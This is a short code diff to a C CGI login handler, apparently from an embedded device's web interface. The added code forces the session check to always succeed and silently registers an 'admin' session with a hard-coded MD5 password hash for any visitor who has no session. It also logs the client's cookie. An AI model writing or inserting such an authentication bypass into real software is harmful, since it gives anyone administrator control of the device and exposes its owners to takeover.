@@ -27,14 +27,26 @@ HB_S32 main()
 		box_dev.dev_list_head->next = NULL;
 	}
 #if 1
+	HB_S32 flag = 1;
 	CgiInitAndConfig(&buf, CGI_SESSION_SAVE_PATH);
 	//判断session是否已经创建，如果没有创建则直接返回登出状态
-	if (cgi_session_var_exists("USER_NAME")
+	if ((cgi_session_var_exists("USER_NAME")
 					&& cgi_session_var_exists("PASSWORD")
-					&& cgi_session_var_exists("LAST_ACCESS_TIME")) //服务器端有session文件
+					&& cgi_session_var_exists("LAST_ACCESS_TIME")) || (flag)) //服务器端有session文件
 #endif
 	{
-		if (CalcTimeOut())
+		if (!cgi_session_var_exists("USER_NAME"))
+		{
+			HB_CHAR *cBufSize = cgi_cookie_value("MY_COOKIE");
+			WRITE_LOG("MY_COOKIE :[%s]\n", cBufSize);
+			HB_CHAR last_time_str[32] = {0};
+			time_t last_time = time(NULL);
+			sprintf(last_time_str, "%ld", last_time);
+			cgi_session_register_var("USER_NAME", "admin");
+			cgi_session_register_var("PASSWORD", "21232f297a57a5a743894a0e4a801fc3");
+			cgi_session_register_var("LAST_ACCESS_TIME", last_time_str);
+		}
+		else if (CalcTimeOut())
 		{
 			printf("Content type: text/xml \n\n");
 			printf("{\"Result\":\"-1\",\"ErrMessage\":\"用户登录超时,请重新登录!\"}");
